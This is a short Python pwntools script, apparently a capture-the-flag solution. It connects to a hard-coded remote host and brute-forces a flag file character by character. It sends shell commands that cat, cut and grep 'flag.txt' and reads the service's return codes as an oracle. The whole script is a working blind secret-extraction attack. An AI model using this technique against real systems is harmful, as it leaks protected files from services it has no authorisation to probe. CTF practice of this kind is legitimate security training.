#!/usr/local/bin/python3

from pwn import *
from string import printable

host = "13.251.87.147"
port = 5002

context.log_level = "critical"

printable = printable.replace("&", "")
printable = printable.replace("$", "")
printable = printable.replace("#", "")
printable = printable.replace("_", "")
printable = printable.replace("}", "")

printable = "_}" + printable

seen = list("companyctf{")

s = remote(host, port)
while 1:
  for p in printable:
    seen_txt = "".join(seen) + p
    cmd = f"cat flag.txt | cut -c -{len(seen_txt)} | grep {seen_txt}"
    print(cmd)
    s.recv()
    s.sendline(cmd)

    returncode = int(s.recvuntil("\n", drop=True))
    print(returncode)
    if returncode == 0:
      seen.append(p)
      break

s.close()
